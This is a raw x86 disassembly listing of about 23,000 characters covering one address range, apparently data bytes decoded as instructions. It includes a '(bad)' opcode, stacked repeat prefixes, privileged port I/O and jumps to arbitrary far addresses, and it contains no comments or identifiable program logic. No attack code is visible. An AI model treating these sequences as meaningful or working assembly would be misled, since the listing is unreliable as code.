  413456:	out    0x0,eax
  413458:	scas   al,BYTE PTR es:[edi]
  413459:	pop    eax
  41345a:	and    eax,0x22375a00
  41345f:	add    BYTE PTR [ebp-0x62ff7566],dh
  413465:	xchg   BYTE PTR [eax+0x0],bh
  413468:	aam    0x58
  41346a:	add    al,0x0
  41346c:	shl    DWORD PTR [ebp+0x19],cl
  41346f:	add    al,cl
  413471:	jb     0x4134a9
  413473:	add    BYTE PTR [esi+0x29],al
  413476:	push   ss
  413477:	add    al,ah
  413479:	cwde   
  41347a:	addr16 add dl,cl
  41347d:	push   edi
  41347e:	add    al,0x0
  413480:	mov    BYTE PTR [esi],bh
  413482:	push   es
  413483:	add    BYTE PTR [esp+ebx*1],bh
  413486:	add    al,0x0
  413488:	js     0x4134c1
  41348a:	or     DWORD PTR [eax],eax
  41348c:	xor    al,0x1d
  41348e:	or     al,0x0
  413490:	imul   ecx,DWORD PTR [edx+0x33],0x54c9c00
  413497:	add    bh,bl
  413499:	xchg   DWORD PTR [ecx],edi
  41349b:	add    BYTE PTR [ebx*1+0x6ad30017],ah
  4134a2:	add    al,0x0
  4134a4:	xor    al,0x1c
  4134a6:	add    al,0x0
  4134a8:	inc    edi
  4134a9:	sub    BYTE PTR [eax],cl
  4134ab:	add    al,bh
  4134ad:	call   0x47ab3589
  4134b2:	sbb    eax,0x8ebde500
  4134b7:	add    cl,dh
  4134b9:	fstp   TBYTE PTR [esi+0x7446a00]
  4134bf:	add    BYTE PTR [eax+0x57002663],cl
  4134c5:	cmp    cl,BYTE PTR [eax]
  4134c7:	add    BYTE PTR [eax-0x35ffca8a],bl
  4134cd:	mov    eax,0xbfc70095
  4134d2:	mov    al,0x0
  4134d4:	jp     0x41352e
  4134d6:	adc    BYTE PTR [eax],al
  4134d8:	test   eax,0xc4004789
  4134dd:	lods   eax,DWORD PTR ds:[esi]
  4134de:	jnp    0x4134e0
  4134e0:	fcmove st,st(6)
  4134e2:	mov    ah,0x0
  4134e4:	in     al,0xda
  4134e6:	lds    eax,FWORD PTR [eax]
  4134e8:	mov    fs,WORD PTR [edi+0x5]
  4134eb:	add    BYTE PTR [edx-0x48ffa362],bh
  4134f1:	xchg   DWORD PTR ds:0x57ba600,eax
  4134f7:	add    BYTE PTR [edi+0x35],al
  4134fa:	pop    es
  4134fb:	add    BYTE PTR [eax],ch
  4134fd:	pop    ds
  4134fe:	or     BYTE PTR [eax],al
  413500:	mov    ecx,0xfa00a4b5
  413505:	neg    dh
  413507:	add    BYTE PTR ds:0x8b00062f,dh
  41350d:	or     BYTE PTR [ecx+0x0],0xa3
  413511:	fwait
  413512:	arpl   WORD PTR [eax],ax
  413514:	cmp    edi,DWORD PTR [eax]
  413516:	and    eax,0x3f575a00
  41351b:	add    ch,dl
  41351d:	aam    0xc8
  41351f:	add    dl,cl
  413521:	leave  
  413522:	mov    edi,0x5707700
  413527:	add    BYTE PTR [edi+0x73],dh
  41352a:	aaa    
  41352b:	add    BYTE PTR ds:0x6200041c,bl
  413531:	popa   
  413532:	dec    edx
  413533:	add    BYTE PTR [eax+0x6f],dh
  413536:	pop    eax
  413537:	add    BYTE PTR [ebp+0x610097ac],ch
  41353d:	arpl   WORD PTR [eax+eax*1],ax
  413540:	dec    edx
  413541:	dec    edx
  413542:	xor    BYTE PTR [eax],al
  413544:	in     eax,0xe5
  413546:	retf   
  413547:	add    ah,ch
  413549:	in     al,dx
  41354a:	fild   DWORD PTR [eax]
  41354c:	in     eax,0xe5
  41354e:	fld    DWORD PTR [eax]
  413550:	(bad)  
  413552:	rol    BYTE PTR [eax],cl
  413554:	cld    
  413555:	cld    
  413556:	repz add BYTE PTR [eax+0x4a],cl
  41355a:	add    eax,0x6a817f00
  41355f:	add    BYTE PTR [edx-0x5dff7a64],bl
  413565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413566:	lea    eax,[eax]
  413568:	mov    BYTE PTR [ecx-0x90bff80],cl
  41356e:	jmp    0x413570
  413570:	xchg   ecx,eax
  413571:	xchg   esi,eax
  413572:	jge    0x413574
  413574:	jmp    0x728c:0x8600e6eb
  41357b:	add    BYTE PTR [ebx+0x79],dh
  41357e:	gs add ah,ch
  413581:	hlt    
  413582:	jmp    0xdc241187
  413587:	add    ah,dh
  413589:	cld    
  41358a:	hlt    
  41358b:	add    BYTE PTR [edx+0x61009ab5],al
  413591:	mov    ds:0x733f009c,al
  413596:	jae    0x413598
  413598:	hlt    
  413599:	cld    
  41359a:	cld    
  41359b:	add    BYTE PTR [eax-0x43],dl
  41359e:	ret    
  41359f:	add    BYTE PTR [edx+ebx*8-0x21],dh
  4135a3:	add    BYTE PTR [eax-0x12],dl
  4135a6:	sti    
  4135a7:	add    al,al
  4135a9:	int3   
  4135aa:	int    0x0
  4135ac:	cs call 0x8a7e36ad
  4135b2:	xchg   ebx,eax
  4135b3:	add    BYTE PTR [edi],bh
  4135b5:	push   edx
  4135b6:	push   esp
  4135b7:	add    bl,ch
  4135b9:	cmc    
  4135ba:	test   BYTE PTR [eax],0x53
  4135bd:	shr    ebp,1
  4135bf:	add    BYTE PTR [edx+edi*4],cl
  4135c2:	cld    
  4135c3:	add    BYTE PTR [ebx],bl
  4135c5:	mov    ecx,0x902400f9
  4135ca:	les    eax,FWORD PTR [eax]
  4135cc:	mov    WORD PTR [eax-0x56e4ff62],ds
  4135d2:	clc    
  4135d3:	add    BYTE PTR [ebp-0x59],al
  4135d6:	jmp    0x4135d8
  4135d8:	and    DWORD PTR [eax-0x77d3ff0b],ebx
  4135de:	xlat   BYTE PTR ds:[ebx]
  4135df:	add    BYTE PTR [edi+0x2b00aea6],bl
  4135e5:	jg     0x4135d5
  4135e7:	add    BYTE PTR [ebx],ch
  4135e9:	addr16 mov ch,0x0
  4135ec:	fsub   st,st(4)
  4135ee:	hlt    
  4135ef:	add    BYTE PTR [ebp-0x1aff424c],ch
  4135f5:	in     al,dx
  4135f6:	test   BYTE PTR [eax],0x22
  4135f9:	dec    esp
  4135fa:	cdq    
  4135fb:	add    ah,cl
  4135fd:	shl    eax,cl
  4135ff:	add    BYTE PTR [esp+edx*2],bl
  413602:	fadd   QWORD PTR [eax]
  413604:	ss imul ebp,ecx,0xf3d2c500
  41360b:	add    BYTE PTR [edx],ch
  41360d:	push   edi
  41360e:	jmp    0xe68d5813
  413613:	add    BYTE PTR [eax+0x6500f1be],dh
  413619:	jg     0x413608
  41361b:	add    BYTE PTR [ecx-0x49ff1269],al
  413621:	mov    ebp,0x6f5300d9
  413626:	in     al,dx
  413627:	add    BYTE PTR [eax+ebp*4+0x3d2400e4],bl
  41362e:	rol    BYTE PTR [eax],1
  413630:	cmp    DWORD PTR [ebp+esi*8+0x0],edx
  413634:	cmp    edx,DWORD PTR [esi-0x18]
  413637:	add    BYTE PTR [eax+0x5f],cl
  41363a:	jmp    0x9300:0xd28f8400
  413641:	fwait
  413642:	les    eax,FWORD PTR [eax]
  413644:	pushw  0x74
  413648:	and    edi,DWORD PTR [ecx+eiz*8]
  41364b:	add    BYTE PTR [esi+eax*2],ch
  41364e:	in     eax,0x0
  413650:	ds dec ebp
  413652:	mov    bl,0x0
  413654:	push   ebx
  413655:	pop    esp
  413656:	cdq    
  413657:	add    BYTE PTR [eax+0x7f],bh
  41365a:	lods   eax,DWORD PTR ds:[esi]
  41365b:	add    BYTE PTR [edi+ebp*1],bl
  41365e:	jecxz  0x413660
  413660:	and    dh,BYTE PTR [esp+ebx*8]
  413663:	add    BYTE PTR [ebx],bl
  413665:	sub    dh,BYTE PTR [eax-0x23c1d400]
  41366b:	add    BYTE PTR [esp+edi*1],ch
  41366e:	aam    0x0
  413670:	sub    DWORD PTR [edi],esi
  413672:	mov    ecx,0xe64a3600
  413677:	add    BYTE PTR [eax],ch
  413679:	ss test eax,0xd9483700
  41367f:	add    BYTE PTR ds:0x59007735,ch
  413685:	rol    WORD PTR [eax],1
  413688:	sub    eax,0x1a006934
  41368d:	sbb    eax,0x7c710039
  413692:	aad    0x0
  413694:	fs ins DWORD PTR es:[edi],dx
  413696:	mov    eax,0xd11d0c00
  41369b:	add    BYTE PTR [eax],dl
  41369d:	pop    ds
  41369e:	mov    edi,0xdf251500
  4136a3:	add    BYTE PTR [edx],ah
  4136a5:	xor    esp,edx
  4136a7:	add    BYTE PTR [eax],ch
  4136a9:	cmp    bh,ah
  4136ab:	add    BYTE PTR [eax],ch
  4136ad:	ss retf 0x1d00
  4136b1:	and    eax,0x43380087
  4136b6:	leave  
  4136b7:	add    BYTE PTR [edx+0x55],cl
  4136ba:	lds    eax,FWORD PTR [eax]
  4136bc:	sbb    esp,DWORD PTR [edi]
  4136be:	enter  0x1200,0x17
  4136c2:	jae    0x4136c4
  4136c4:	adc    dl,BYTE PTR [esi]
  4136c6:	bound  eax,QWORD PTR [eax]
  4136c8:	and    ch,BYTE PTR [ecx]
  4136ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136cb:	add    BYTE PTR [eax],ah
  4136cd:	sub    BYTE PTR [ecx-0x13becb00],bl
  4136d3:	add    BYTE PTR [eax+eiz*1],bl
  4136d6:	push   0x0
  4136d8:	pop    ds
  4136d9:	and    ebx,DWORD PTR [eax+0x0]
  4136dc:	sub    ebp,DWORD PTR [esi]
  4136de:	push   edi
  4136df:	add    BYTE PTR ds:0x11005e3f,bh
  4136e5:	pop    ss
  4136e6:	mov    cl,0x0
  4136e8:	adc    DWORD PTR ds:0x2a24009f,edx
  4136ee:	in     eax,0x0
  4136f0:	daa    
  4136f1:	sub    ecx,eax
  4136f3:	add    BYTE PTR [edx+ebp*1],ah
  4136f6:	mov    eax,0xdc312c00
  4136fb:	add    BYTE PTR ds:0x1a00d433,ch
  413701:	sbb    al,0x58
  413703:	add    BYTE PTR [ecx],dh
  413705:	xor    eax,0x2c2a0093
  41370a:	jne    0x41370c
  41370c:	dec    esi
  41370d:	dec    edi
  41370e:	jo     0x413710
  413710:	or     al,0xe
  413712:	rol    DWORD PTR [eax],1
  413714:	or     ecx,DWORD PTR [esi]
  413716:	mov    esi,0xc8171400
  41371b:	add    BYTE PTR [edi],dl
  41371d:	sbb    edx,esi
  41371f:	add    BYTE PTR [ebx],ah
  413721:	and    eax,0x1a1800da
  413726:	mov    BYTE PTR [eax],al
  413728:	xor    eax,0x3800dd38
  41372d:	cmp    BYTE PTR [eax+eax*1+0x481c1b],dh
  413734:	sub    ebp,DWORD PTR [ecx+ebp*2]
  413737:	add    BYTE PTR [edi+0x70],ch
  41373a:	fwait
  41373b:	add    BYTE PTR [esi-0xbff637a],al
  413741:	hlt    
  413742:	cld    
  413743:	add    ah,bh
  413745:	cld    
  413746:	cld    
  413747:	add    ah,dh
  413749:	hlt    
  41374a:	hlt    
  41374b:	add    BYTE PTR [eax],al
  41374d:	adc    al,0x56
  41374f:	aaa    
  413750:	jae    0x413722
  413752:	out    0xe5,al
  413754:	jmp    0xf434405b
  413759:	hlt    
  41375a:	repz hlt 
  41375c:	repz repz or edx,esi
  413760:	repnz fiadd WORD PTR [esp+ecx*1]
  413764:	add    edi,ecx
  413766:	or     BYTE PTR [eax+eax*1],cl
  413769:	or     ecx,edi
  41376b:	or     al,0xc
  41376d:	or     al,0xcf
  41376f:	iret   
  413770:	in     al,dx
  413771:	cmc    
  413772:	out    0x2,al
  413774:	icebp  
  413775:	add    BYTE PTR [edi],al
  413777:	repnz add BYTE PTR ds:0xf2f1f2f0,bl
  41377e:	add    al,BYTE PTR [edx]
  413780:	repnz add al,BYTE PTR [edx]
  413783:	add    dh,dl
  413785:	repnz shl eax,cl
  413788:	repnz repnz repnz repz hlt 
  41378d:	aam    0xdb
  41378f:	aam    0x3
  413791:	jmp    0x4137a5
  413793:	push   esi
  413794:	outs   dx,BYTE PTR ds:[esi]
  413795:	outs   dx,BYTE PTR ds:[esi]
  413796:	dec    ecx
  413797:	add    BYTE PTR [esi+ebp*2],al
  41379a:	add    BYTE PTR [esi+edx*2],al
  41379d:	push   0x6e
  41379f:	dec    ecx
  4137a0:	add    BYTE PTR [eax],al
  4137a2:	add    BYTE PTR ds:0xb673342f,al
  4137a8:	out    0x0,al
  4137aa:	add    al,0xf2
  4137ac:	add    BYTE PTR [edi],cl
  4137ae:	fcomi  st,st(3)
  4137b0:	repz hlt 
  4137b2:	repnz repz repnz repnz repz repz cmc 
  4137b9:	or     al,0x53
  4137bb:	or     al,0x14
  4137bd:	add    BYTE PTR [eax],cl
  4137bf:	or     al,0x0
  4137c1:	pop    ss
  4137c2:	iret   
  4137c3:	iret   
  4137c4:	or     al,0xc
  4137c6:	or     al,0xcf
  4137c8:	fsubr  st(6),st
  4137ca:	in     eax,0xd3
  4137cc:	icebp  
  4137cd:	shl    edx,cl
  4137cf:	repnz rol DWORD PTR [edx],cl
  4137d2:	rol    DWORD PTR [edx],cl
  4137d4:	add    al,BYTE PTR [edx]
  4137d6:	repnz icebp 
  4137d8:	repnz add BYTE PTR [edx+eax*1],al
  4137dc:	add    BYTE PTR ds:0xf3f1f2d3,bl
  4137e2:	lock shl al,cl
  4137e5:	repz lock repz repz hlt 
  4137ea:	hlt    
  4137eb:	add    eax,DWORD PTR [ebx]
  4137ed:	or     ah,bl
  4137ef:	outs   dx,BYTE PTR ds:[esi]
  4137f0:	push   0x56
  4137f2:	push   esi
  4137f3:	outs   dx,BYTE PTR ds:[esi]
  4137f4:	outs   dx,BYTE PTR ds:[esi]
  4137f5:	push   esi
  4137f6:	push   esi
  4137f7:	push   esi
  4137f8:	push   0x6a
  4137fa:	push   0x0
  4137fc:	add    BYTE PTR [eax],al
  4137fe:	add    BYTE PTR [edi],al
  413800:	dec    esi
  413801:	and    esp,DWORD PTR [esi+esi*4+0x2]
  413805:	repnz repnz add BYTE PTR [ebx+esi*8],al
  41380a:	add    BYTE PTR [ebx],ah
  41380c:	or     ebx,esi
  41380e:	or     ebx,esi
  413810:	repnz repnz lock repnz out 0x53,al
  413816:	push   ebx
  413817:	adc    al,0x53
  413819:	push   ebx
  41381a:	or     al,0x53
  41381c:	or     al,0xc
  41381e:	push   ebx
  41381f:	or     al,0xc
  413821:	iret   
  413822:	iret   
  413823:	iret   
  413824:	or     al,0x4
  413826:	fsubr  st(5),st
  413828:	repnz shl ecx,cl
  41382b:	repnz add al,BYTE PTR [edx]
  41382e:	add    al,BYTE PTR [eax]
  413830:	add    al,0xe5
  413832:	add    BYTE PTR [eax],cl
  413834:	add    ah,ch
  413836:	in     eax,0x2
  413838:	in     eax,0x2
  41383a:	in     eax,0x2
  41383c:	add    al,0xf2
  41383e:	add    BYTE PTR [edx],bl
  413840:	lock shl al,cl
  413843:	repnz repnz or esp,edx
  413847:	hlt    
  413848:	out    0xea,eax
  41384a:	add    eax,DWORD PTR [ebx]
  41384c:	add    eax,0x6e6e4de3
  413851:	push   0x56
  413853:	outs   dx,BYTE PTR ds:[esi]
  413854:	outs   dx,BYTE PTR ds:[esi]
  413855:	push   esi
  413856:	push   0x6a
  413858:	push   0xffffff82
  41385a:	add    BYTE PTR [eax],al
  41385c:	add    BYTE PTR [edx],bl
  41385e:	and    BYTE PTR [edi],bl
  413860:	pop    ecx
  413861:	mov    cl,0xf2
  413863:	repnz repnz repz repnz repz repnz repz repz repz lock repz repnz repz lock
  413871:	out    0xc,al
  413873:	or     al,0x53
  413875:	or     al,0xc
  413877:	push   ebx
  413878:	add    eax,0x100e000c
  41387d:	clc    
  41387e:	clc    
  41387f:	add    al,0xdd
  413881:	fadd   QWORD PTR [edx]
  413883:	repnz repnz icebp 
  413886:	rol    DWORD PTR [edx],cl
  413888:	add    ah,ch
  41388a:	add    al,0xe6
  41388c:	add    BYTE PTR [edi],ah
  41388e:	in     eax,0xe6
  413890:	in     eax,0xe6
  413892:	in     eax,0xf1
  413894:	in     eax,0xf2
  413896:	repnz shl dl,cl
  413899:	repnz repnz repz repnz lock repz repz or edi,esp
  4138a2:	hlt    
  4138a3:	hlt    
  4138a4:	add    esi,esi
  4138a6:	add    eax,0x566e080a
  4138ab:	push   esi
  4138ac:	push   esi
  4138ad:	push   0x56
  4138af:	push   0x6a
  4138b1:	push   0x5d
  4138b3:	pop    ebx
  4138b4:	pop    eax
  4138b5:	add    BYTE PTR [eax],al
  4138b7:	add    BYTE PTR [eax],al
  4138b9:	or     bl,BYTE PTR [edi]
  4138bb:	pop    ds
  4138bc:	pop    ecx
  4138bd:	scas   al,BYTE PTR es:[edi]
  4138be:	or     ebx,esi
  4138c0:	repnz repz repz repnz add eax,0xf22f00f3
  4138c9:	repnz repnz repz cmc 
  4138cd:	push   ebx
  4138ce:	ja     0x4138dc
  4138d0:	push   ebx
  4138d1:	or     al,0x53
  4138d3:	or     al,0xc
  4138d5:	iret   
  4138d6:	or     al,0xcf
  4138d8:	clc    
  4138d9:	fstp   st(4)
  4138db:	cmc    
  4138dc:	out    0x2,al
  4138de:	repnz add dl,bl
  4138e1:	add    dl,bl
  4138e3:	add    ah,ch
  4138e5:	in     eax,0xe5
  4138e7:	cmc    
  4138e8:	out    0xe6,al
  4138ea:	out    0xe5,al
  4138ec:	in     eax,0x2
  4138ee:	in     eax,0x2
  4138f0:	add    dh,dl
  4138f2:	repnz shl dl,cl
  4138f5:	lock rol BYTE PTR [eax],cl
  4138f8:	add    al,0xf3
  4138fa:	add    BYTE PTR [esi],dl
  4138fc:	hlt    
  4138fd:	repz out 0xe7,eax
  413900:	hlt    
  413901:	add    eax,DWORD PTR ds:0x4d080503
  413907:	push   0x6e
  413909:	outs   dx,BYTE PTR ds:[esi]
  41390a:	push   esi
  41390b:	push   0x56
  41390d:	pop    ebp
  41390e:	pop    ebx
  41390f:	pop    ebx
  413910:	popa   
  413911:	popa   
  413912:	add    BYTE PTR [eax],al
  413914:	add    BYTE PTR [eax],cl
  413916:	sbb    al,0x1c
  413918:	pop    ecx
  413919:	scas   al,BYTE PTR es:[edi]
  41391a:	fcomi  st,st(2)
  41391c:	or     edx,esi
  41391e:	add    al,0xf3
  413920:	add    BYTE PTR [ebx],cl
  413922:	lock shl dl,cl
  413925:	lock repnz rcr bl,cl
  413929:	out    0xc,al
  41392b:	push   ebx
  41392c:	push   ebx
  41392d:	add    BYTE PTR ds:0xcf0a000c,al
  413933:	or     al,0xf8
  413935:	fucom  st(6)
  413937:	in     eax,0xe5
  413939:	repnz repnz repnz add al,0x2
  41393e:	add    BYTE PTR ds:0xe6e5e5e9,bl
  413944:	in     eax,0xe5
  413946:	in     eax,0xd3
  413948:	add    al,BYTE PTR [edx]
  41394a:	in     eax,0xd3
  41394c:	icebp  
  41394d:	icebp  
  41394e:	repnz repz lock repz rcl dl,cl
  413954:	shl    bl,cl
  413956:	rcl    ah,cl
  413958:	repz hlt 
  41395a:	hlt    
  41395b:	hlt    
  41395c:	add    eax,DWORD PTR [eax]
  41395e:	add    al,0x5
  413960:	add    BYTE PTR ds:0x56566e11,cl
  413966:	push   0x56
  413968:	das    
  413969:	pop    ebp
  41396a:	pop    ebx
  41396b:	jnp    0x4139ce
  41396d:	pop    esi
  41396e:	js     0x413970
  413970:	add    BYTE PTR [eax],al
  413972:	add    BYTE PTR [ecx],ch
  413974:	and    bl,BYTE PTR [ebx]
  413976:	inc    eax
  413977:	test   eax,0xf3f3d2e8
  41397c:	lock repz shl bl,cl
  413980:	jmp    0xaeb1:0xb6b30d05
  413987:	test   al,0x71
  413989:	push   ebx
  41398a:	push   ebx
  41398b:	or     al,0xc
  41398d:	iret   
  41398e:	iret   
  41398f:	or     al,0xc
  413991:	iret   
  413992:	fsubr  st(5),st
  413994:	in     eax,0x2
  413996:	repnz repz shl dl,cl
  41399a:	repnz shl bl,cl
  41399d:	add    BYTE PTR [edx+esi*8],al
  4139a0:	add    BYTE PTR ds:0xf3f2f3d2,al
  4139a6:	repz add BYTE PTR [esi],al
  4139a9:	repnz add BYTE PTR [eax],ah
  4139ac:	repz repnz repz shl bl,cl
  4139b1:	shl    bl,cl
  4139b3:	aam    0xf3
  4139b5:	aam    0x9
  4139b7:	aam    0x9
  4139b9:	out    0xe7,eax
  4139bb:	add    eax,DWORD PTR ds:0x56ef0d05
  4139c1:	outs   dx,BYTE PTR ds:[esi]
  4139c2:	push   esi
  4139c3:	push   0x5d
  4139c5:	pop    ebx
  4139c6:	jnp    0x413953
  4139c8:	xchg   ebx,eax
  4139c9:	fwait
  4139ca:	fwait
  4139cb:	xchg   esp,eax
  4139cc:	add    BYTE PTR [eax],al
  4139ce:	add    BYTE PTR [eax],bl
  4139d0:	daa    
  4139d1:	sbb    edi,DWORD PTR [esi]
  4139d3:	inc    ecx
  4139d4:	call   0xec360ccc
  4139d9:	add    eax,0x92a7b10d
  4139de:	add    DWORD PTR [ecx+0x40595a6d],eax
  4139e4:	push   ebx
  4139e5:	push   ebx
  4139e6:	or     al,0x77
  4139e8:	add    eax,0xdc2a000c
  4139ed:	rcl    ebx,cl
  4139ef:	add    bl,bl
  4139f1:	jmp    0x32a3cdf
  4139f6:	add    ch,cl
  4139f8:	jmp    0xa293ce6
  4139fd:	fcomi  st,st(3)
  4139ff:	repz repz aam 0xd4
  413a03:	lock shl bl,cl
  413a06:	aam    0xf0
  413a08:	aam    0xf3
  413a0a:	repz aam 0xf4
  413a0d:	aam    0xd4
  413a0f:	aam    0xf3
  413a11:	repz repz aam 0xf4
  413a15:	out    0x4,eax
  413a17:	add    eax,0x6eef0d00
  413a1c:	push   0x6a
  413a1e:	pop    ebp
  413a1f:	pop    ebx
  413a20:	mov    ebx,DWORD PTR [ebx-0x75756c6b]
  413a26:	xchg   esp,eax
  413a27:	add    BYTE PTR [eax],al
  413a29:	add    BYTE PTR [eax],al
  413a2b:	and    esp,DWORD PTR [edi]
  413a2d:	sbb    ecx,DWORD PTR [eax-0x57]
  413a30:	shl    BYTE PTR [ebx-0x2584e4a],1
  413a36:	add    DWORD PTR [ebp+0x5a],ebp
  413a39:	pop    ecx
  413a3a:	dec    edx
  413a3b:	dec    eax
  413a3c:	xor    DWORD PTR [edx],edi
  413a3e:	and    DWORD PTR [esi+ebp*2],ebx
  413a41:	push   ebx
  413a42:	push   ebx
  413a43:	push   ebx
  413a44:	push   ds
  413a45:	push   ebx
  413a46:	imul   ecx,DWORD PTR [edi+0x17],0x1a
  413a4a:	sbb    BYTE PTR [eax],bl
  413a4c:	sbb    bl,BYTE PTR [eax]
  413a4e:	sbb    al,BYTE PTR [eax]
  413a50:	add    al,0x18
  413a52:	add    BYTE PTR [ebx],al
  413a54:	sub    bl,BYTE PTR [eax]
  413a56:	sbb    BYTE PTR [eax],al
  413a58:	pop    es
  413a59:	sbb    DWORD PTR [eax],eax
  413a5b:	daa    
  413a5c:	adc    edx,DWORD PTR es:[ebx]
  413a5f:	adc    DWORD PTR [ecx],edx
  413a61:	push   cs
  413a62:	femms  
  413a64:	push   cs
  413a65:	push   es
  413a66:	or     cl,BYTE PTR [edx]
  413a68:	or     cl,BYTE PTR [ecx]
  413a6a:	hlt    
  413a6b:	out    0xd4,eax
  413a6d:	aam    0xd4
  413a6f:	out    0xd4,eax
  413a71:	add    esi,esi
  413a73:	add    eax,0x2b0b0505
  413a78:	push   0x5d
  413a7a:	pop    ebx
  413a7b:	jns    0x413a18
  413a7d:	fwait
  413a7e:	mov    esi,DWORD PTR [esi+0x76]
  413a81:	lahf   
  413a82:	xchg   esp,eax
  413a83:	add    BYTE PTR [eax],al
  413a85:	add    BYTE PTR [eax],al
  413a87:	and    BYTE PTR [ebx],bl
  413a89:	and    DWORD PTR [ecx],esi
  413a8b:	mov    es,WORD PTR [ecx]
  413a8d:	std    
  413a8e:	std    
  413a8f:	ins    DWORD PTR es:[edi],dx
  413a90:	pop    ecx
  413a91:	pop    ecx
  413a92:	dec    edx
  413a93:	xor    DWORD PTR ds:0x3a2d212d,ebp
  413a99:	and    DWORD PTR ds:0x556b5522,ebp
  413a9f:	dec    ebp
  413aa0:	push   ebp
  413aa1:	imul   edx,DWORD PTR [edi],0x3b
  413aa4:	and    BYTE PTR [edi],bl
  413aa6:	pop    ds
  413aa7:	and    al,BYTE PTR [edi+ebx*1]
  413aaa:	add    BYTE PTR [eax],cl
  413aac:	sbb    al,0x1f
  413aae:	and    bl,BYTE PTR [edx+eiz*1]
  413ab1:	daa    
  413ab2:	daa    
  413ab3:	and    cl,BYTE PTR [eax]
  413ab5:	daa    
  413ab6:	add    BYTE PTR [edx+eiz*1],ah
  413ab9:	and    ah,BYTE PTR [edx]
  413abb:	pop    ds
  413abc:	pop    ds
  413abd:	pop    ds
  413abe:	sbb    al,0x32
  413ac0:	xor    dh,BYTE PTR [ecx]
  413ac2:	ss cmp BYTE PTR ss:[ebp+0x50a0bef],bh
  413aca:	add    eax,DWORD PTR [ebx]
  413acc:	add    eax,0x6a0b0505
  413ad1:	pop    ebp
  413ad2:	pop    ebx
  413ad3:	jbe    0x413a68
  413ad5:	xchg   edi,eax
  413ad6:	xchg   ebx,eax
  413ad7:	xchg   ebx,eax
  413ad8:	mov    bl,0xb3
  413ada:	add    eax,0x5
  413adf:	and    DWORD PTR ss:[ebx],ebx
  413ae2:	and    DWORD PTR [edx+0x3e],ecx
  413ae5:	dec    eax
  413ae6:	dec    eax
  413ae7:	xor    DWORD PTR [esi+0x3a],eax
  413aea:	cmp    ch,BYTE PTR ds:0x213a3a4b
  413af0:	and    DWORD PTR [edx],esp
  413af2:	pop    ds
  413af3:	pop    ds
  413af4:	dec    edi
  413af5:	imul   edx,DWORD PTR [ebp+0x4d],0x55
  413af9:	dec    ebp
  413afa:	das    
  413afb:	pop    ds
  413afc:	pop    ds
  413afd:	pop    ds
  413afe:	sub    BYTE PTR [edi],bl
  413b00:	pop    ds
  413b01:	sbb    al,0x1f
  413b03:	and    bl,BYTE PTR [edi]
  413b05:	and    bl,BYTE PTR [edi]
  413b07:	sub    BYTE PTR [edx],ah
  413b09:	and    ah,BYTE PTR [edi]
  413b0b:	and    ah,BYTE PTR [edi]
  413b0d:	daa    
  413b0e:	daa    
  413b0f:	sbb    esp,DWORD PTR [edi]
  413b11:	daa    
  413b12:	daa    
  413b13:	and    ah,BYTE PTR [edx]
  413b15:	and    al,BYTE PTR [esp+ebx*1]
  413b18:	add    BYTE PTR [ebx],al
  413b1a:	and    ah,BYTE PTR [edi]
  413b1c:	cmp    al,BYTE PTR [eax]
  413b1e:	add    eax,0x54160046
  413b23:	inc    esi
  413b24:	dec    ebx
  413b25:	xor    DWORD PTR [esi],esi
  413b27:	inc    eax
  413b28:	cmp    BYTE PTR ds:0x5b5d0b0d,cl
  413b2e:	popa   
  413b2f:	nop
  413b30:	fwait
  413b31:	fwait
  413b32:	xchg   ebp,eax
  413b33:	mov    bl,0xb3
  413b35:	fwait
  413b36:	loopne 0x413b3b
  413b38:	add    BYTE PTR [eax],al
  413b3a:	add    DWORD PTR [edi],esp
  413b3c:	add    al,0x21
  413b3e:	add    BYTE PTR [ecx],bh
  413b40:	cmp    al,BYTE PTR [esi+0x46]
  413b43:	inc    esi
  413b44:	sub    eax,0x3a212d4b
  413b49:	daa    
  413b4a:	daa    
  413b4b:	and    BYTE PTR [ebx],ah
  413b4d:	and    BYTE PTR [edi],bl
  413b4f:	push   ebp
  413b50:	dec    edi
  413b51:	dec    ebp
  413b52:	push   ebp
  413b53:	cs sbb eax,0x1f1c1f1f
  413b59:	pop    ds
  413b5a:	sbb    al,0x1c
  413b5c:	sbb    al,0x22
  413b5e:	pop    ds
  413b5f:	and    bl,BYTE PTR [edi]
  413b61:	and    bl,BYTE PTR [edx+eiz*1]
  413b64:	and    ah,BYTE PTR [edx]
  413b66:	daa    
  413b67:	daa    
  413b68:	and    ah,BYTE PTR [edx]
  413b6a:	daa    
  413b6b:	daa    
  413b6c:	daa    
  413b6d:	and    ah,BYTE PTR [edx]
  413b6f:	and    bl,BYTE PTR [edi]
  413b71:	sbb    al,0x1c
  413b73:	pop    ds
  413b74:	sbb    al,0x1c
  413b76:	daa    
  413b77:	cmp    cl,BYTE PTR [ebx+0x0]
  413b7a:	add    al,0x46
  413b7c:	add    DWORD PTR [ebx+0x1],ecx
  413b7f:	dec    ebx
  413b80:	add    eax,0x4b0f0046
  413b85:	xor    DWORD PTR [ecx],esi
  413b87:	dec    esp
  413b88:	popa   
  413b89:	jbe    0x413b26
  413b8b:	xchg   ebp,eax
  413b8c:	xchg   edi,eax
  413b8d:	lahf   
  413b8e:	mov    edx,0xb3b2b3b3
  413b93:	add    BYTE PTR [eax],al
  413b95:	add    BYTE PTR [eax],al
  413b97:	sub    ah,BYTE PTR [ecx]
  413b99:	and    DWORD PTR [edi],esp
  413b9b:	cmp    bh,BYTE PTR [edx]
  413b9d:	inc    esi
  413b9e:	inc    esi
  413b9f:	inc    esi
  413ba0:	dec    ebx
  413ba1:	dec    ebx
  413ba2:	and    DWORD PTR ds:0x1d1c1b21,ebp
  413ba8:	and    al,0x2e
  413baa:	and    BYTE PTR [eax],ch
  413bac:	push   esi
  413bad:	push   ebp
  413bae:	push   ebp
  413baf:	and    BYTE PTR cs:[edi+ebx*1],bl
  413bb3:	sbb    al,0x1f
  413bb5:	sbb    al,0x1f
  413bb7:	sbb    al,0x1c
  413bb9:	sbb    al,0x1f
  413bbb:	and    bl,BYTE PTR [edx+eiz*1]
  413bbe:	and    bl,BYTE PTR [edx+eiz*1]
  413bc1:	and    al,BYTE PTR ds:0x6220527
  413bc7:	pop    ds
  413bc8:	add    BYTE PTR [esi],bl
  413bca:	and    bh,BYTE PTR [edx]
  413bcc:	cmp    ch,BYTE PTR ds:0x4b464b46
  413bd2:	dec    ebx
  413bd3:	inc    esi
  413bd4:	sub    eax,0x4b464b46
  413bd9:	dec    ebx
  413bda:	inc    esi
  413bdb:	push   ecx
  413bdc:	pop    bx
  413bde:	nop
